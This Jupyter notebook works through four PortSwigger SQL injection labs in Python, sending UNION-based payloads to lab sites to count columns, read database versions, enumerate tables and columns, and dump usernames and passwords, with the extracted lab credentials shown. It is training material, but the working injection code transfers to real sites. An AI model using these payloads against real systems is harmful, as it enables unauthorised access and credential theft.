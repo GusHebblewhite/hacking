{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "78a1c138",
   "metadata": {},
   "source": [
    "https://portswigger.net/web-security/sql-injection/examining-the-database"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "55d87940",
   "metadata": {
    "heading_collapsed": true
   },
   "source": [
    "# Question 1 : Oracle\n",
    "\n",
    "\n",
    "https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 45,
   "id": "fb11dded",
   "metadata": {
    "hidden": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[<Response [500]>, <Response [200]>, <Response [500]>, <Response [500]>]\n"
     ]
    }
   ],
   "source": [
    "import requests\n",
    "\n",
    "URL = \"https://ac1e1f461e951c0c80ae807400e0008c.web-security-academy.net/\"\n",
    "\n",
    "#Work out how many columns the returned query has\n",
    "results = []\n",
    "for x in range(1, 5):\n",
    "    #NB we need to add \"FROM DUAL\" because this is an oracle database\n",
    "    query = \"filter?category='+UNION+SELECT+{}+FROM+DUAL--\".format((\"NULL,\" * x)[:-1])\n",
    "    r = requests.get(URL + query)\n",
    "    results.append(r)\n",
    "print(results)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "134420da",
   "metadata": {
    "hidden": true
   },
   "source": [
    "From the responses we can see that we have two columns returned. \n",
    "\n",
    "Next we want to work out which field will accept string data types:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 46,
   "id": "4e946226",
   "metadata": {
    "hidden": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[<Response [200]>, <Response [200]>]\n"
     ]
    }
   ],
   "source": [
    "results = []\n",
    "\n",
    "n_columns = 2\n",
    "for x in range(n_columns):\n",
    "    NULLs = [\"NULL\"]*n_columns\n",
    "    NULLs[x] = \"\\'a\\'\"\n",
    "    query = \"filter?category='+UNION+SELECT+{}+FROM+DUAL--\".format(\",\".join(NULLs))\n",
    "    r = requests.get(URL + query)\n",
    "    results.append(r)\n",
    "print(results)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "78a6045f",
   "metadata": {
    "hidden": true
   },
   "source": [
    "Either of the two columns seem to be compatible with text. \n",
    "\n",
    "Ok so now that we've done the reconnaissance let's actually run our union attack to get the database information.\n",
    "\n",
    "One quick thing to note here is that Oracle returns the database information in a single column with the heading \"BANNER\". Since the original database has two columns we need to add a column to our query so the UNION works."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 47,
   "id": "1b75db66",
   "metadata": {
    "hidden": true
   },
   "outputs": [],
   "source": [
    "#Final payload\n",
    "query = \"filter?category='+UNION+SELECT+BANNER,'a'+FROM+V$VERSION--\"\n",
    "r = requests.get(URL + query)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "44a43d06",
   "metadata": {
    "hidden": true
   },
   "source": [
    "Success!"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a4aa622d",
   "metadata": {
    "heading_collapsed": true
   },
   "source": [
    "# Question 2 : MySQL\n",
    "\n",
    "https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 62,
   "id": "3d257357",
   "metadata": {
    "hidden": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[<Response [500]>, <Response [200]>, <Response [500]>, <Response [500]>]\n"
     ]
    }
   ],
   "source": [
    "import requests\n",
    "\n",
    "URL = \"https://ac131f981fa34dc980990ee8009800aa.web-security-academy.net/\"\n",
    "\n",
    "#Work out how many columns the returned query has\n",
    "results = []\n",
    "for x in range(1, 5):\n",
    "    #NB we need to add a space after the comment for MySQL\n",
    "    query = \"filter?category=' UNION SELECT+{}-- \".format((\"NULL,\" * x)[:-1])\n",
    "    r = requests.get(URL + query)\n",
    "    results.append(r)\n",
    "print(results)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "e3eac3eb",
   "metadata": {
    "hidden": true
   },
   "source": [
    "As in the oracle case we have two columns.\n",
    "\n",
    "Now lets check which are text compatible:\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 67,
   "id": "d173039d",
   "metadata": {
    "hidden": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[<Response [200]>, <Response [200]>]\n"
     ]
    }
   ],
   "source": [
    "#Work out how many columns the returned query has\n",
    "results = []\n",
    "n_columns = 2\n",
    "for x in range(n_columns):\n",
    "    NULLs = [\"NULL\"] * n_columns\n",
    "    NULLs[x] = \"\\'a\\'\"\n",
    "    #NB we need to add a space after the comment for MySQL\n",
    "    query = \"filter?category=' UNION SELECT+{} -- \".format(\",\".join(NULLs))\n",
    "    r = requests.get(URL + query)\n",
    "    results.append(r)\n",
    "print(results)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "db764461",
   "metadata": {
    "hidden": true
   },
   "source": [
    "Once again both columns are string compatible. Cool. Ok now for the payload."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 83,
   "id": "572b438f",
   "metadata": {
    "hidden": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<Response [200]>\n"
     ]
    }
   ],
   "source": [
    "#Final payload\n",
    "query = \"filter?category=' UNION SELECT NULL,@@version -- \"\n",
    "r = requests.get(URL + query)\n",
    "print(r)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "6d748eaf",
   "metadata": {
    "hidden": true
   },
   "source": [
    "Yay it worked! Now we just need to paste it into the PortSwigger lab."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 84,
   "id": "3d2d8074",
   "metadata": {
    "hidden": true
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "\"filter?category='+UNION+SELECT+NULL,@@version+--+\""
      ]
     },
     "execution_count": 84,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "query.replace(\" \", \"+\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "95509334",
   "metadata": {
    "heading_collapsed": true
   },
   "source": [
    "# Question 3: Getting Database Info (Non-Oracle)\n",
    "https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "6771fff6",
   "metadata": {
    "hidden": true
   },
   "source": [
    "We can assument that we know the original query returns two columns, and that both of them are string compatible.\n",
    "\n",
    "To grab the database information, we'll UNION inject. To make the dimensions of the union injection match the original query we will concatenate the columns."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 39,
   "id": "fb5e9e98",
   "metadata": {
    "hidden": true
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<Response [200]>"
      ]
     },
     "execution_count": 39,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "import requests\n",
    "\n",
    "i_s = \"information_schema\"\n",
    "URL = \"https://ac4a1f791e6257cf804939c500b400ca.web-security-academy.net/\"\n",
    "query = f\"filter?category=' UNION SELECT CONCAT(TABLE_NAME, '~', TABLE_TYPE),NULL FROM {i_s}.tables -- \"\n",
    "\n",
    "r = requests.get(URL + query)\n",
    "r"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "b53af09a",
   "metadata": {
    "hidden": true
   },
   "source": [
    "Ok this appears to work. There are a lot of tables returned. Let's print them out:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 51,
   "id": "856c371e",
   "metadata": {
    "hidden": true
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['sql_parts',\n",
       " 'products',\n",
       " 'sql_languages',\n",
       " 'sql_sizing',\n",
       " 'users_yxfmuy',\n",
       " 'sql_implementation_info',\n",
       " 'sql_sizing_profiles',\n",
       " 'sql_packages',\n",
       " 'sql_features']"
      ]
     },
     "execution_count": 51,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "import re\n",
    "\n",
    "tables = [x.split(\"~\") for x in re.findall(r\"<th>(.*)</th>\", r.text)]\n",
    "\n",
    "#print only BASE TABLEs and tables without \"pg_\"\n",
    "base_tables = [x[0] for x in tables if (x[1]==\"BASE TABLE\" and not \"pg_\" in x[0])]\n",
    "base_tables"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 53,
   "id": "57b5b4dc",
   "metadata": {
    "hidden": true
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<Response [200]>"
      ]
     },
     "execution_count": 53,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "table_name = \"users_yxfmuy\"\n",
    "\n",
    "query = f\"filter?category=\\' UNION SELECT CONCAT(COLUMN_NAME, \\'~\\', DATA_TYPE),NULL \" + \\\n",
    "f\"FROM {i_s}.columns WHERE TABLE_NAME = \\'{table_name}\\' -- \"\n",
    "\n",
    "r = requests.get(URL + query)\n",
    "r"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 54,
   "id": "4e9f27b0",
   "metadata": {
    "hidden": true
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[['password_cctbkm', 'character varying'],\n",
       " ['username_prihbh', 'character varying']]"
      ]
     },
     "execution_count": 54,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "import re\n",
    "\n",
    "tables = [x.split(\"~\") for x in re.findall(r\"<th>(.*)</th>\", r.text)]\n",
    "tables"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "e8554c60",
   "metadata": {
    "hidden": true
   },
   "source": [
    "OK that looks pretty promising!\n",
    "\n",
    "Lets grab those!"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 55,
   "id": "66242a5a",
   "metadata": {
    "hidden": true
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<Response [200]>"
      ]
     },
     "execution_count": 55,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "query = f\"filter?category=\\' UNION SELECT CONCAT(username_prihbh, \\'~\\', password_cctbkm),NULL \" + \\\n",
    "f\"FROM {table_name} -- \"\n",
    "\n",
    "r = requests.get(URL + query)\n",
    "r"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 56,
   "id": "c16d3c75",
   "metadata": {
    "hidden": true
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[['carlos', 'vqjfd37bbgcn160re59d'],\n",
       " ['administrator', 'o7ib8q9ttrkx2djq4xwz'],\n",
       " ['wiener', 'zja6d3q4bwacmaiu8bey']]"
      ]
     },
     "execution_count": 56,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "tables = [x.split(\"~\") for x in re.findall(r\"<th>(.*)</th>\", r.text)]\n",
    "tables"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "d0e12322",
   "metadata": {
    "hidden": true
   },
   "source": [
    "Bingo!"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "c6f59f58",
   "metadata": {
    "heading_collapsed": true
   },
   "source": [
    "# Question 4: Getting Database Info (Oracle)\n",
    "https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 65,
   "id": "599e7738",
   "metadata": {
    "hidden": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "USER$\n",
      "USERS_VIALDZ\n",
      "USER_ASTATUS_MAP\n",
      "USER_HISTORY$\n"
     ]
    }
   ],
   "source": [
    "import requests\n",
    "import re\n",
    "\n",
    "URL = \"https://acac1f831fc79b16c032236400450085.web-security-academy.net/\"\n",
    "query = \"filter?category=' UNION SELECT TABLE_NAME,NULL from all_tables -- \"\n",
    "\n",
    "r = requests.get(URL + query)\n",
    "\n",
    "#Print returned query\n",
    "tables = re.findall(r\"<th>(.*)</th>\", r.text)\n",
    "\n",
    "#Find tables starting with \"USER\"\n",
    "for each_table in tables:\n",
    "    if \"USER\" == each_table[:4]:\n",
    "        print(each_table)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 71,
   "id": "14082fd9",
   "metadata": {
    "hidden": true
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['PASSWORD_AMWWJS', 'USERNAME_GMRIYJ']"
      ]
     },
     "execution_count": 71,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "table_name = \"USERS_VIALDZ\"\n",
    "query = f\"filter?category=' UNION SELECT column_name,NULL from all_tab_columns WHERE table_name = \\'{table_name}\\' -- \"\n",
    "\n",
    "r = requests.get(URL + query)\n",
    "\n",
    "#Print returned query\n",
    "tables = re.findall(r\"<th>(.*)</th>\", r.text)\n",
    "tables"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 80,
   "id": "9697b41b",
   "metadata": {
    "hidden": true
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['administrator~iyc691q82xn5monk2w2v',\n",
       " 'carlos~ndckc2hx4t6kaggjvi1g',\n",
       " 'wiener~w7ubogdv266ho430nc8l']"
      ]
     },
     "execution_count": 80,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "query = f\"filter?category=' UNION SELECT (USERNAME_GMRIYJ || '~' || PASSWORD_AMWWJS),NULL from {table_name} -- \"\n",
    "\n",
    "r = requests.get(URL + query)\n",
    "re.findall(r\"<th>(.*)</th>\", r.text)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "4fc91135",
   "metadata": {
    "hidden": true
   },
   "source": [
    "YAY!"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ab752dbb",
   "metadata": {
    "hidden": true
   },
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.18"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
